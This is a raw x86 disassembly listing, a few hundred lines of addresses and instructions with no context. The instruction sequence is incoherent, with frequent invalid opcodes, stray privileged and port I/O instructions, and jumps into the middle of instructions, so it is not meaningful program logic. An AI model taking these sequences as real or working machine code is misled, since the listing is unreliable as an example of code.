  4243b5:	in     eax,0x52
  4243b7:	inc    ebp
  4243b8:	addr16 mov eax,ds:0x5a70
  4243bc:	adc    al,0xce
  4243be:	aad    0xd0
  4243c0:	rol    DWORD PTR [esi+edx*8+0x0],cl
  4243c4:	add    BYTE PTR [ebx-0x10],bh
  4243c7:	jg     0x424378
  4243c9:	int    0xc8
  4243cb:	test   DWORD PTR [eax],0x925f3200
  4243d1:	test   DWORD PTR [di+0x6983],edx
  4243d6:	jecxz  0x42435a
  4243d8:	cli    
  4243d9:	test   ch,al
  4243db:	add    BYTE PTR [eax],al
  4243dd:	cmp    DWORD PTR [esi+0x2c10d7d],ebp
  4243e3:	sub    BYTE PTR [eax+0x2528b10a],ah
  4243e9:	or     al,0xd2
  4243eb:	add    BYTE PTR [eax],al
  4243ed:	daa    
  4243ee:	mov    cl,0x74
  4243f0:	sahf   
  4243f1:	bound  ebx,QWORD PTR [ecx]
  4243f3:	mov    al,ds:0xf72b26eb
  4243f8:	(bad)  
  4243f9:	lahf   
  4243fa:	push   0x4
  4243fc:	data16 add BYTE PTR [eax],al
  4243ff:	arpl   WORD PTR [eax],dx
  424401:	push   esp
  424402:	dec    ecx
  424403:	mov    eax,0x9e61948b
  424408:	icebp  
  424409:	sub    DWORD PTR [esi-0x1067673b],ebx
  42440f:	jns    0x424404
  424411:	iret   
  424412:	ins    DWORD PTR es:[edi],dx
  424413:	iret   
  424414:	aaa    
  424415:	add    bh,ah
  424417:	add    BYTE PTR [eax],al
  424419:	fucomp st(4)
  42441b:	into   
  42441c:	rol    edx,0xd5
  42441f:	nop
  424420:	in     al,dx
  424421:	data16 jbe 0x424467
  424424:	xchg   esp,eax
  424425:	test   DWORD PTR [edx],edx
  424427:	push   ebp
  424428:	js     0x4243c0
  42442a:	jmp    0x42446c
  42442c:	sub    eax,DWORD PTR [eax]
  42442e:	add    BYTE PTR [ecx+0x63],bh
  424431:	pop    ss
  424432:	hlt    
  424433:	mov    eax,ds:0xedb07c49
  424438:	push   edx
  424439:	dec    esp
  42443a:	mov    edi,0x5e5d0000
  42443f:	outs   dx,BYTE PTR ds:[esi]
  424440:	and    eax,ebx
  424442:	dec    eax
  424443:	sldt   WORD PTR [eax]
  424446:	inc    eax
  424447:	lods   al,BYTE PTR ds:[esi]
  424448:	add    BYTE PTR [eax],al
  42444a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42444b:	push   eax
  42444c:	les    edx,FWORD PTR [ebp+0x47e10000]
  424452:	mov    ebx,0x2eb3f92b
  424457:	pop    ebp
  424458:	sbb    ch,BYTE PTR [ecx+ecx*2+0x79bad817]
  42445f:	pushf  
  424460:	or     ebx,DWORD PTR [edi]
  424462:	retf   0xb3a8
  424465:	cmc    
  424466:	push   cs
  424467:	sub    BYTE PTR [eax+0x720000df],al
  42446d:	retf   
  42446e:	mov    ecx,DWORD PTR [edx]
  424470:	ror    BYTE PTR [edi],1
  424472:	inc    eax
  424473:	aam    0x0
  424475:	add    al,ah
  424477:	xor    bl,ch
  424479:	(bad)  
  42447a:	clc    
  42447b:	add    BYTE PTR [eax],al
  42447d:	gs inc eax
  42447f:	mov    ebp,0x9a0e0000
  424484:	xor    ebx,DWORD PTR ds:0x2bc0197a
  42448a:	add    BYTE PTR [eax],al
  42448c:	mov    edx,0x11c0d2b3
  424491:	add    BYTE PTR [eax],al
  424493:	jl     0x4244bf
  424495:	sbb    BYTE PTR ds:0x8e595fe3,dl
  42449b:	imul   edx,DWORD PTR cs:[edi+0x478cede5],0x935c0000
  4244a6:	andnps xmm6,XMMWORD PTR [edi-0x42]
  4244aa:	pop    ss
  4244ab:	cmp    ch,0x7d
  4244ae:	push   cs
  4244af:	inc    esp
  4244b0:	rol    DWORD PTR [eax],1
  4244b2:	add    BYTE PTR [esi+0x4184e9f0],bl
  4244b8:	add    BYTE PTR [eax],al
  4244ba:	out    0x22,eax
  4244bc:	jnp    0x42447b
  4244be:	imul   edx,eax,0x9f3a5b73
  4244c4:	jecxz  0x4244f7
  4244c6:	jae    0x424459
  4244c8:	pop    ebx
  4244c9:	daa    
  4244ca:	pop    es
  4244cb:	xchg   ebx,eax
  4244cc:	repz pop edx
  4244ce:	idiv   DWORD PTR [bp+0x6231]
  4244d3:	xchg   esp,eax
  4244d4:	in     eax,dx
  4244d5:	std    
  4244d6:	(bad)  
  4244d7:	xchg   esp,eax
  4244d8:	mov    esi,0x543666a3
  4244dd:	sub    DWORD PTR [esi],eax
  4244df:	and    eax,0x7fa4d25a
  4244e4:	(bad)
  4244e9:	mov    eax,0x4f529d7d
  4244ee:	fild   QWORD PTR [eax-0x34035aff]
  4244f4:	sbb    ebp,eax
  4244f6:	xchg   esi,eax
  4244f7:	rcl    DWORD PTR [ecx+0x4f4ef805],1
  4244fd:	pop    esp
  4244fe:	imul   edi,edi,0x70
  424501:	and    al,0x6c
  424503:	fs (bad) 
  424505:	mov    ch,0xbd
  424507:	mov    ebx,0x64de594f
  42450c:	fld    TBYTE PTR [esp+esi*1+0x6d]
  424510:	clc    
  424511:	in     al,0xa7
  424513:	gs inc eax
  424515:	add    al,0x0
  424517:	add    BYTE PTR [ebp+0x34],dh
  42451a:	pusha  
  42451b:	jle    0x4244f8
  42451d:	inc    esp
  42451e:	sbb    eax,0xb47c0000
  424523:	ret    
  424524:	sbb    al,cl
  424526:	and    eax,DWORD PTR [eax]
  424528:	add    bh,al
  42452a:	(bad)  [esi]
  42452c:	lods   eax,DWORD PTR ds:[esi]
  42452d:	mov    ah,0x17
  42452f:	mov    al,0xa3
  424531:	inc    ebp
  424532:	add    al,0x3d
  424534:	add    BYTE PTR [eax],al
  424536:	inc    ebp
  424537:	hlt    
  424538:	mov    esi,DWORD PTR [edx]
  42453a:	pop    edi
  42453b:	inc    ebx
  42453c:	xchg   edi,eax
  42453d:	push   es
  42453e:	mov    ecx,DWORD PTR [ecx]
  424540:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424541:	out    dx,eax
  424542:	mov    ebp,0x9a80b7
  424547:	add    BYTE PTR [edi],bl
  424549:	and    al,0x5
  42454b:	sahf   
  42454c:	pop    esp
  42454d:	(bad)  [eax+0x29]
  424550:	stos   BYTE PTR es:[edi],al
  424551:	test   al,0xde
  424553:	(bad)  
  424554:	fnstsw WORD PTR [esi]
  424556:	shl    cl,1
  424558:	nop
  424559:	dec    eax
  42455a:	test   BYTE PTR [eax],al
  42455c:	add    BYTE PTR [edi+0x5c],bl
  42455f:	outs   dx,BYTE PTR ds:[esi]
  424560:	fiadd  WORD PTR [ebx]
  424562:	add    BYTE PTR [eax],dl
  424564:	add    BYTE PTR [eax],al
  424566:	cld    
  424567:	jp     0x424523
  424569:	dec    esp
  42456a:	aam    0x0
  42456c:	add    BYTE PTR [edx-0x12],bl
  42456f:	cli    
  424570:	jl     0x424595
  424572:	fcmovu st,st(1)
  424574:	in     eax,0x16
  424576:	aad    0x52
  424578:	sti    
  424579:	std    
  42457a:	jmp    0x42454e
  42457c:	stc    
  42457d:	or     al,0x7b
  42457f:	add    BYTE PTR [eax],al
  424581:	or     eax,0x5eaa9caf
  424586:	jae    0x424530
  424588:	sub    eax,0x6d7b2911
  42458d:	mov    dh,BYTE PTR [eax]
  42458f:	jno    0x42453b
  424591:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424592:	fisubr WORD PTR [edi-0x4a]
  424595:	or     ch,al
  424597:	add    BYTE PTR [eax],al
  424599:	shl    DWORD PTR [ebp-0x208ba7ff],cl
  42459f:	sub    BYTE PTR [ebp+ebp*1+0x7ac30000],cl
  4245a6:	sbb    eax,0xde3568eb
  4245ab:	std    
  4245ac:	or     bh,BYTE PTR [esi+0x55e07e18]
  4245b2:	test   BYTE PTR [ecx-0x152c0000],dh
  4245b8:	pop    edi
  4245b9:	out    0x52,eax
  4245bb:	fsubr  DWORD PTR [edx+edi*4+0x2e7b87ea]
  4245c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245c3:	xchg   ecx,eax
  4245c4:	dec    eax
  4245c5:	push   edi
  4245c6:	add    BYTE PTR [eax],al
  4245c8:	adc    BYTE PTR ds:0xd6324f4f,dh
  4245ce:	cli    
  4245cf:	hlt    
  4245d0:	dec    edi
  4245d1:	dec    ebx
  4245d2:	fdiv   DWORD PTR [ebp+0x9]
  4245d5:	test   esp,esi
  4245d7:	adc    ah,BYTE PTR [edx+0x65cccdd5]
  4245dd:	add    BYTE PTR [eax],al
  4245df:	and    eax,0xb84cb2d6
  4245e4:	add    BYTE PTR [eax],al
  4245e6:	mov    esp,0x1408be
  4245eb:	add    ah,ch
  4245ed:	mov    bh,0x49
  4245ef:	or     DWORD PTR [edx-0x52],ecx
  4245f2:	scas   al,BYTE PTR es:[edi]
  4245f3:	out    dx,eax
  4245f4:	stos   BYTE PTR es:[edi],al
  4245f5:	mov    dl,0x1
  4245f7:	sti    
  4245f8:	bound  edx,QWORD PTR [edi]
  4245fa:	bnd ret 
  4245fc:	shl    BYTE PTR [ebx-0x12adad8c],cl
  424602:	fist   WORD PTR [edx+0x76]
  424605:	xor    al,0x12
  424607:	mov    ds:0x10f473e,eax
  42460c:	imul   esi,DWORD PTR [ebx+0x49a7fa3f],0x8e4e2b2d
  424616:	dec    edi
  424617:	dec    ebx
  424618:	das    
  424619:	int    0xa5
  42461b:	inc    ebx
  42461c:	js     0x4245fb
  42461e:	stos   DWORD PTR es:[edi],eax
  42461f:	xor    BYTE PTR [edx+0x0],0x0
  424623:	pop    ds
  424624:	adc    DWORD PTR [ecx-0x6da2e5b6],0x65
  42462b:	iret   
  42462c:	ins    BYTE PTR es:[edi],dx
  42462d:	mov    esi,0x21bc956f
  424632:	out    0x21,al
  424634:	add    al,0x62
  424636:	add    BYTE PTR [eax],al
  424638:	jae    0x42468f
  42463a:	jecxz  0x424655
  42463c:	sub    eax,esp
  42463e:	aad    0x59
  424640:	xor    al,BYTE PTR ds:0x1bb1afd9
  424646:	fs dec bh
  424649:	cmp    BYTE PTR ds:0xac6e0000,0x8e
  424650:	sbb    ch,0x2e
  424653:	mov    ah,0x1
  424655:	aaa    
  424656:	jl     0x42469d
  424658:	ds (bad) 
  42465a:	cli    
  42465b:	sti    
  42465c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42465d:	adc    BYTE PTR [edx+0x12f756fd],ah
  424663:	or     DWORD PTR [eax-0x2f],edx
  424666:	dec    edi
  424667:	int3   
  424668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424669:	add    BYTE PTR [eax],al
  42466b:	iret   
  42466c:	cld    
  42466d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42466e:	shr    BYTE PTR [ebp+0x0],0x0
  424672:	jne    0x424646
  424674:	(bad)  
  424675:	loopne 0x42469c
  424677:	aas    
  424678:	add    al,0xaf
  42467a:	add    BYTE PTR [eax],al
  42467c:	inc    eax
  42467d:	xchg   BYTE PTR [eax],al
  42467f:	add    BYTE PTR [edi],dl
  424681:	jnp    0x424669
  424683:	inc    eax
  424684:	mov    ds:0xf0dd0000,eax
  424689:	in     eax,dx
  42468a:	popf   
  42468b:	mov    bl,BYTE PTR [ebx+0x20]
  42468e:	xor    eax,0xb3d3ac68
  424693:	hlt    
  424694:	ja     0x4246e7
  424696:	and    dh,BYTE PTR [esi+eax*8-0x3da84c85]
  42469d:	xor    dl,BYTE PTR [esi]
  42469f:	in     eax,0xc
  4246a1:	push   esi
  4246a2:	add    BYTE PTR [eax],al
  4246a4:	fimul  DWORD PTR [edi]
  4246a6:	pop    esp
  4246a7:	in     al,0x58
  4246a9:	test   al,0x2d
  4246ab:	push   eax
  4246ac:	loopne 0x42470b
  4246ae:	rol    BYTE PTR [ecx],1
  4246b0:	jecxz  0x424694
  4246b2:	loopne 0x4246b1
  4246b4:	push   0xec8c4b
  4246b9:	add    dh,dh
  4246bb:	mov    esp,0x92ab78fd
  4246c0:	test   al,0x52
  4246c2:	inc    esi
  4246c3:	and    esi,DWORD PTR [ebp+0x6ff5d633]
  4246c9:	test   eax,0xc2410dfd
  4246ce:	mov    dl,0xc6
  4246d0:	add    eax,DWORD PTR [ebp-0x3e5faf20]
  4246d6:	outs   dx,DWORD PTR ds:[esi]
  4246d7:	outs   dx,DWORD PTR ds:[esi]
  4246d8:	and    DWORD PTR [ecx+0x29],esi
  4246db:	int    0xfa
  4246dd:	loop   0x424724
  4246df:	mov    ebx,0xc84cf7af
  4246e4:	add    BYTE PTR [eax],al
  4246e6:	test   al,0x14
  4246e8:	(bad)  
  4246e9:	pop    edi
  4246ea:	pop    esi
  4246eb:	call   0x0:0x2348ff8a
  4246f2:	retf   
  4246f3:	xchg   ebp,eax
  4246f4:	xor    ch,BYTE PTR [edi-0x244f9d8d]
  4246fa:	mov    edx,0x34bbcbe7
  4246ff:	xlat   BYTE PTR ds:[ebx]
  424700:	inc    ecx
  424701:	xor    bl,BYTE PTR [ebx-0x6e]
  424704:	mov    esi,0x49e57622
  424709:	imul   esp,DWORD PTR [ecx+0x19],0x3ea26f05
  424710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424711:	lods   eax,DWORD PTR ds:[esi]
  424712:	mov    edx,0x94f13536
  424717:	inc    ecx
  424718:	(bad)  
  424719:	call   0x98d1:0x60c70620
  424720:	cmp    ebx,DWORD PTR [ecx+0x2c]
  424723:	mov    bh,0xc9
  424725:	inc    edi
  424726:	out    dx,al
  424727:	in     eax,dx
  424728:	lea    ebx,[edi]
  42472a:	xor    DWORD PTR [edi],ebp
  42472c:	test   DWORD PTR [ebx+esi*8+0x2f280000],0xfba5651e
  424737:	out    0x71,al
  424739:	mov    DWORD PTR [esi+edx*4],esp
  42473c:	retf   
  42473d:	in     eax,dx
  42473e:	xchg   edi,eax
  42473f:	xchg   esp,eax
  424740:	aas    
  424741:	mov    BYTE PTR [edx+0x0],ch
  424744:	add    BYTE PTR [esi+edi*2+0x440ecd46],bh
  42474b:	or     al,0x0
  42474d:	add    BYTE PTR [edi+0x42],dl
  424750:	stos   BYTE PTR es:[edi],al
  424751:	fdivr  QWORD PTR [ebp+ecx*4+0x76]
  424755:	jae    0x424735
  424757:	(bad)  
  424758:	sub    BYTE PTR [esi],cl
  42475a:	add    DWORD PTR [ebp+0x61],eax
  42475d:	not    BYTE PTR [edx]
  42475f:	jne    0xfc76c880
  424765:	jg     0x424797
  424767:	jb     0x42472b
  424769:	jns    0x42471e
  42476b:	inc    eax
  42476c:	mov    DWORD PTR [eax],0xda685500
  424772:	cwde   
  424773:	sub    eax,DWORD PTR [ebp+0x4a88]
  424779:	test   ax,0x59b1
  42477d:	es push eax
  42477f:	mov    edi,0x88df0ffd
  424784:	pop    ebp
  424785:	add    BYTE PTR [eax],al
  424787:	lods   eax,DWORD PTR ds:[esi]
  424788:	dec    ebx
  424789:	stos   BYTE PTR es:[edi],al
  42478a:	fwait
  42478b:	push   ds
  42478c:	out    dx,al
  42478d:	push   ebx
  42478e:	sahf   
  42478f:	call   0x526d56b6
  424794:	js     0x4247c5
  424796:	lock ins DWORD PTR es:[edi],dx
  424798:	lods   al,BYTE PTR ds:[esi]
  424799:	int3   
  42479a:	fild   DWORD PTR [eax]
  42479c:	add    BYTE PTR [eax-0x47c22acd],bh
  4247a2:	or     eax,DWORD PTR [ecx]
  4247a4:	mov    esp,0x36452659
  4247a9:	outs   dx,DWORD PTR ds:[esi]
  4247aa:	sub    cl,ah
  4247ac:	fstp   st(5)
  4247ae:	imul   edi,DWORD PTR [esi-0x2a],0xfffffff0
  4247b2:	xor    DWORD PTR [edx+0x12],ebp
  4247b5:	test   DWORD PTR [ecx+0x11],edi
  4247b8:	dec    ebp
  4247b9:	clc    
  4247ba:	xor    edi,DWORD PTR [edx-0x25e1a9e7]
  4247c0:	cmp    edi,DWORD PTR ds:0xb59016b6
  4247c6:	xchg   ecx,eax
  4247c7:	iret   
  4247c8:	out    dx,al
  4247c9:	inc    edx
  4247ca:	ja     0x42d4d8
  4247d0:	pop    esi
  4247d1:	ror    BYTE PTR [esi-0x1b0a4f67],1
  4247d7:	das    
  4247d8:	mov    esp,0xbcd6b568
  4247dd:	data16 mov WORD PTR [ebx+0x0],?
  4247e1:	add    al,bl
  4247e3:	(bad)  [ecx]
  4247e5:	sbb    eax,0x23d6e796
  4247ea:	add    BYTE PTR [ebx+0x0],ah
  4247ed:	add    BYTE PTR [edi+edi*4],dl
  4247f0:	pop    eax
  4247f1:	(bad)  
  4247f2:	cmp    BYTE PTR [edi+0x4a],dl
  4247f5:	cmp    esp,eax
  4247f7:	sub    al,0x0
  4247f9:	add    BYTE PTR [ecx-0x10e59f6f],dh
  4247ff:	push   ss
  424800:	cmp    eax,0xeb8066cf
  424805:	add    BYTE PTR [eax],al
  424807:	inc    esi
  424808:	test   DWORD PTR [ebx],ebx
  42480a:	push   cs
  42480b:	stc    
  42480c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42480d:	(bad)  
  42480e:	gs ret 
  424810:	sub    DWORD PTR [ecx+esi*8+0x6c],edx
  424814:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424815:	pop    ss
  424816:	cwde   
  424817:	dec    ebp
  424818:	or     bl,BYTE PTR [edx+0x27]
  42481b:	sbb    edi,edi
  42481d:	(bad)  
  42481e:	in     al,dx
  42481f:	test   esp,eax
  424821:	mov    ds:0x5b120000,al
  424826:	fcomp  st(2)
  424828:	out    0x74,al
  42482a:	not    ah
  42482c:	dec    esp
  42482d:	xor    eax,0x70d80000
  424832:	out    0xca,al
  424834:	xor    eax,0xcb7a657a
  424839:	pop    DWORD PTR [edx+0x69]
  42483c:	(bad)  
  42483d:	cmc    
  42483e:	pop    edx
  42483f:	add    esp,DWORD PTR [edi]
  424841:	adc    al,0x47
  424843:	inc    ebp
  424844:	adc    BYTE PTR [ecx+0x5743fd95],0x79
  42484b:	jg     0x42482d
  42484d:	pop    es
  42484e:	mov    esp,0x9091db7
  424853:	data16 jecxz 0x4248c9
  424856:	cmp    al,0x7a
  424858:	jbe    0x4247da
  42485a:	xchg   edx,eax
  42485b:	add    BYTE PTR [eax],al
  42485d:	xlat   BYTE PTR ds:[ebx]
  42485e:	and    eax,0x304835da
  424863:	add    BYTE PTR [eax],al
  424865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424866:	push   0xffffff85
  424868:	mov    ebp,esp
  42486a:	femms  
  42486c:	out    0x8,al
  42486e:	outs   dx,DWORD PTR ds:[esi]
  42486f:	add    BYTE PTR [eax],al
  424871:	sti    
  424872:	into   
  424873:	dec    edi
  424874:	stc    
  424875:	adc    dh,bh
  424877:	sub    eax,0xc57ff151
  42487c:	xor    esi,DWORD PTR [esi+0x41f83f36]
  424882:	jecxz  0x42485c
  424884:	pop    edx
  424885:	and    eax,0xfa952fe3
  42488a:	xor    BYTE PTR [edi+0x70],cl
  42488d:	in     al,dx
  42488e:	mov    ecx,0x4579d116
  424893:	hlt    
  424894:	retfw  0x760b
  424898:	or     DWORD PTR [ebx+ebp*4+0x0],0x57ca6300
  4248a0:	repz mov gs,WORD PTR [edx+0x9a4f114]
  4248a7:	add    BYTE PTR [eax+0x4b5b0000],ah
  4248ad:	repnz sar BYTE PTR [ebx+0x39bbe6b],1
  4248b4:	mov    ah,0xe5
  4248b6:	pop    ebx
  4248b7:	neg    BYTE PTR [edx+0x5a977961]
  4248bd:	or     al,0x1b
  4248bf:	add    BYTE PTR [eax],al
  4248c1:	jno    0x424927
  4248c3:	pop    ecx
  4248c4:	ds cmp eax,0x1e6995fc
  4248ca:	std    
  4248cb:	sar    DWORD PTR [eax],0x2d
  4248ce:	jnp    0x424893
  4248d0:	add    BYTE PTR [edi+0x0],ah
  4248d3:	add    BYTE PTR [edi+0x4d],bl
  4248d6:	mov    al,ds:0xc32b6858
  4248db:	jecxz  0x42490b
  4248dd:	xor    al,BYTE PTR [ecx-0x5f70e699]
  4248e3:	aas    
  4248e4:	xchg   edi,eax
  4248e5:	cmp    dl,BYTE PTR [ebx+0x796f963d]
  4248eb:	jle    0x42488e
  4248ed:	in     al,0x5d
  4248ef:	jnp    0x4248b9
  4248f1:	cmc    
  4248f2:	add    BYTE PTR [eax],al
  4248f4:	(bad)  
  4248f5:	jecxz  0x42490e
  4248f7:	push   0x74
  4248f9:	mov    edx,0xa0446b
  4248fe:	add    al,ah
  424900:	loopne 0x4248eb
  424902:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424903:	pop    edi
  424904:	sti    
  424905:	in     eax,0xa4
  424907:	push   esi
  424908:	stos   DWORD PTR es:[edi],eax
  424909:	sbb    al,0x80
  42490b:	mov    esp,0xd88c0000
  424910:	add    BYTE PTR [eax],al
  424912:	dec    eax
  424913:	pop    ss
  424914:	add    BYTE PTR [eax],al
  424916:	pop    esp
  424917:	addr16 jmp 0x70b8:0xa1e93c58
  42491f:	inc    edi
  424920:	jne    0x42497a
  424922:	xor    eax,0x3e4b859e
  424927:	and    eax,0xb253ddb4
  42492c:	xchg   esp,eax
  42492d:	in     al,0x92
  42492f:	lea    ebx,[edi]
  424931:	aaa    
  424932:	fidiv  WORD PTR [ecx+edx*1]
  424935:	mov    WORD PTR [eax+eax*1+0x0],?
  424939:	push   cs
  42493a:	xor    al,0xa5
  42493c:	or     BYTE PTR [ebx+0x729d0000],0xb6
  424943:	jl     0x42496f
  424945:	adc    al,0xa6
  424947:	clc    
  424948:	leave  
  424949:	aas    
  42494a:	mov    dl,0x20
  42494c:	lds    esi,FWORD PTR [edi]
  42494e:	pop    eax
  42494f:	fbstp  TBYTE PTR [ecx+0x65eff48e]
  424955:	inc    edi
  424956:	inc    ebx
  424957:	clc    
  424958:	ficom  WORD PTR [esi+eiz*4]
  42495b:	loope  0x4249ce
  42495d:	fdiv   DWORD PTR [eax]
  42495f:	ds dec esp
  424961:	fadd   DWORD PTR [eax]
  424963:	add    dh,bl
  424965:	in     eax,0x7e
  424967:	outs   dx,BYTE PTR ds:[esi]
  424968:	mov    edx,0xb67760f9
  42496d:	(bad)  
  42496e:	stos   BYTE PTR es:[edi],al
  42496f:	cmp    BYTE PTR [edx-0x9],ch
  424972:	leave  
  424973:	dec    esp
  424974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424975:	add    BYTE PTR [eax],al
  424977:	call   0x1a91305b
  42497c:	add    eax,0xf1c3bf5
  424981:	inc    edi
  424982:	push   ds
  424983:	imul   ebp,DWORD PTR [edi-0x33371af3],0xa0d40000
  42498d:	fisub  DWORD PTR [edi-0x4c]
  424990:	call   0x9b942d3f
  424995:	inc    edi
  424996:	fnstcw WORD PTR [ebx-0x608bb9f6]
  42499c:	repz dec ebx
  42499e:	pop    eax
  42499f:	loope  0x4249cf
  4249a1:	int3   
  4249a2:	mov    BYTE PTR [eax],0x0
  4249a5:	add    eax,0xae6e6897
  4249aa:	(bad)  
  4249ac:	(bad)  
  4249ad:	mov    bl,0x5e
  4249af:	pop    es
  4249b0:	and    esi,esi
  4249b2:	jecxz  0x424a04
  4249b4:	pop    esp
  4249b5:	mov    BYTE PTR [edi-0x586f0000],dl
  4249bb:	push   0xffffffdd
  4249bd:	and    bl,ah
  4249bf:	or     eax,0x41f6a3d8
  4249c4:	out    0xe4,eax
  4249c6:	dec    ebp
  4249c7:	aas    
  4249c8:	(bad)  
  4249c9:	sbb    edx,esp
  4249cb:	and    eax,0x193f76b0
  4249d0:	pop    ebx
  4249d1:	dec    ebp
  4249d2:	mov    bl,0xa
  4249d4:	inc    edi
  4249d5:	stos   DWORD PTR es:[edi],eax
  4249d6:	add    al,0xc0
  4249d8:	add    BYTE PTR [eax],al
  4249da:	xchg   edi,eax
  4249db:	sbb    ch,0x73
  4249de:	fst    DWORD PTR [eax+edx*8+0x2f724f3c]
  4249e5:	pop    ss
  4249e6:	adc    DWORD PTR [ecx],esp
  4249e8:	inc    ebp
  4249e9:	bound  ebx,QWORD PTR [edx]
  4249eb:	mov    al,ss:0x7254bd9a
  4249f1:	push   ss
  4249f2:	mov    eax,DWORD PTR [esi-0x17]
  4249f5:	cmp    BYTE PTR [esi-0x6e63e0a5],cl
  4249fb:	fcom   DWORD PTR [ecx+0x898cc3]
  424a01:	add    BYTE PTR ds:0x429b5c1f,bh
  424a07:	xor    eax,0xc8e58f89
  424a0c:	sldt   WORD PTR [eax]
  424a0f:	or     dh,BYTE PTR [esi-0x77]
  424a12:	jge    0x424a80
  424a14:	popf   
  424a15:	ds dec esi
  424a17:	mov    edi,0xbe95565
  424a1c:	leave  
  424a1d:	sbb    ch,BYTE PTR [edx+0x78]
  424a20:	sbb    DWORD PTR [ecx+0xb],eax
  424a23:	rcr    BYTE PTR [edx+0x5f],cl
  424a26:	xchg   ecx,eax
  424a27:	in     al,0xa9
  424a29:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  424a2b:	push   ds
  424a2c:	mov    al,0xa
  424a2e:	fwait
  424a2f:	(bad)  
  424a30:	ins    BYTE PTR es:[edi],dx
  424a31:	enter  0xe5,0x0
  424a35:	sub    eax,0x2acd3cd2
  424a3a:	or     eax,0xcafb123c
  424a3f:	xchg   ebp,eax
  424a40:	jbe    0x424a26
  424a42:	lock sub ch,BYTE PTR [ebx]
  424a45:	retf   
  424a46:	jo     0x424a26
  424a48:	enter  0x51,0x0
  424a4c:	gs inc esi
  424a4e:	mov    eax,0x12466023
  424a53:	and    BYTE PTR [edi+0x6a],ch
  424a56:	xor    ebp,DWORD PTR [edi+0x5157b52]
  424a5c:	push   esi
  424a5d:	iret   
  424a5e:	push   edi
  424a5f:	xchg   edx,eax
  424a60:	adc    DWORD PTR [ecx*4-0xf56d0d],esi
  424a67:	repz enter 0x6f,0x0
  424a6c:	popf   
  424a6d:	pop    ecx
  424a6e:	dec    esi
  424a6f:	or     ebx,DWORD PTR [ecx]
  424a71:	in     eax,dx
  424a72:	add    eax,0xaa5600e
  424a77:	call   0x45:0xc4fe9376
  424a7e:	add    BYTE PTR [edi+0xe1d1ec],bl
  424a84:	push   es
  424a85:	add    BYTE PTR [eax],al
  424a87:	jno    0x424aae
  424a89:	loop   0x424a98
  424a8b:	cmp    al,0xe6
  424a8d:	cmp    ebx,DWORD PTR [ecx-0x28]
  424a90:	pop    edi
  424a91:	aas    
  424a92:	ja     0x424ae5
  424a94:	in     al,0x94
  424a96:	jb     0x424a20
  424a98:	add    DWORD PTR [eax],0x0
  424a9b:	enter  0x11,0x0
  424a9f:	dec    ecx
  424aa0:	adc    eax,0x68c7a69d
  424aa5:	(bad)  
  424aa7:	retf   0x281c
  424aaa:	or     al,0xa1
  424aac:	add    BYTE PTR [eax],al
  424aae:	jnp    0x424b0c
  424ab0:	pop    edx
  424ab1:	sbb    cl,ah
  424ab3:	aad    0x66
  424ab5:	jge    0x424aba
  424ab7:	inc    ecx
  424ab8:	js     0x424a50
  424aba:	bound  ebx,QWORD PTR [esi+0x32]
  424abd:	mov    ds:0x1a032e33,al
  424ac2:	clc    
  424ac3:	jmp    DWORD PTR [edx]
  424ac5:	loope  0x424ae5
  424ac7:	push   eax
  424ac8:	xor    al,0x9
  424aca:	cmc    
  424acb:	arpl   WORD PTR [ecx],sp
  424acd:	inc    ecx
  424ace:	sbb    DWORD PTR [ecx+0x17],edi
  424ad1:	gs aas 
  424ad3:	cmp    dl,BYTE PTR [eax+0x56f04de1]
  424ad9:	cs jae 0x424abe
  424adc:	jne    0x424af2
  424ade:	out    dx,eax
  424adf:	adc    DWORD PTR [esi*1+0x17b636f7],edx
  424ae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ae7:	into   
  424ae8:	or     edx,DWORD PTR [esi-0x34a38a86]
  424aee:	lock repz test DWORD PTR [ecx],ebp
  424af2:	inc    edx
  424af3:	(bad)  
  424af4:	shl    BYTE PTR [ebx+0x5e],cl
  424af7:	test   al,0xc
  424af9:	mov    ch,0x0
  424afb:	add    BYTE PTR [ecx-0x76],bh
  424afe:	repz xchg ebp,eax
  424b00:	sbb    esi,DWORD PTR [edi-0x207001a8]
  424b06:	call   0xc8df:0x27132583
  424b0d:	xchg   BYTE PTR [eax],al
  424b0f:	add    bl,bl
  424b11:	(bad)  
  424b12:	pop    ebx
  424b13:	(bad)  
  424b14:	jmp    0x424ac0
  424b16:	dec    ebp
  424b17:	and    ch,cl
  424b19:	daa    
  424b1a:	dec    ecx
  424b1b:	sbb    ah,ch
  424b1d:	sbb    bh,BYTE PTR [ebx-0x4]
  424b20:	icebp  
  424b21:	push   ss
  424b22:	cmp    DWORD PTR [ecx-0x63],edx
  424b25:	ds dec esp
  424b27:	stc    
  424b28:	add    BYTE PTR [eax],al
  424b2a:	pop    edx
  424b2b:	sub    edx,ebx
  424b2d:	cmp    edx,DWORD PTR [ebx-0x40879a6e]
  424b33:	(bad)  
  424b34:	fwait
  424b35:	das    
  424b36:	jo     0x424b0f
  424b38:	jns    0x424b80
  424b3a:	add    eax,0x14c8
  424b3f:	jno    0x424b8f
  424b41:	cdq    
  424b42:	in     al,0xb1
  424b44:	or     BYTE PTR [ebp+0x0],dh
  424b47:	add    BYTE PTR [ecx+0x36c9e716],al
  424b4d:	lahf   
  424b4e:	paddsb mm0,QWORD PTR [ecx+eax*4]
  424b52:	add    BYTE PTR [eax],al
  424b54:	hlt    
  424b55:	dec    edi
  424b56:	jge    0x424bca
  424b58:	push   cs
  424b59:	mov    ch,0xbb
  424b5b:	cmp    BYTE PTR [edx+0x7a],dh
  424b5e:	out    0xe9,al
  424b60:	push   ebx
  424b61:	ret    
  424b62:	add    ch,BYTE PTR [eax-0x60f1afbf]
  424b68:	outs   dx,BYTE PTR ds:[esi]
  424b69:	xchg   bx,ax
